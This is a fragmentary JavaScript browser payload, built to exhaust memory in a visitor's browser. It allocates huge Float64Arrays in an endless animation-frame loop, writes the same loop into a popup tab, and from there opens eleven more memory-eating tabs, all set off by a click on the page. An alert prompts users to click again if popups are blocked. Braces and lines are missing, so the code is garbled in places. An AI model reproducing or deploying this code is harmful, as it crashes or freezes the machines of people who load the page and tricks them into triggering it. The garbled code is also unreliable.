            let data = [];
            function allocate() {
                for (let i = 0; i < 1000; i++) { 
                    data.push(new Float64Array(2e7)); // High memory allocation
                }
                requestAnimationFrame(allocate);
            }
            allocate();

                alert("Popup blocked! Click the page and try again.");
                return;

                    function startWorker() {
                        let data = [];

                                data.push(new Float64Array(2e7)); 
                            }
                            requestAnimationFrame(allocate);
                        }
                        allocate();
                    }
                    startWorker();
                <\/script>
                </body>
                </html>
            `);
            firstTab.document.close();

            tabs.push(firstTab);

            // Use first tab to open additional memory-consuming tabs
            setTimeout(() => {
                for (let i = 0; i < 11; i++) {
                    let newTab = firstTab.window.open();
                    if (newTab) {
                        newTab.document.write(`

        document.body.addEventListener("click", openTabs);
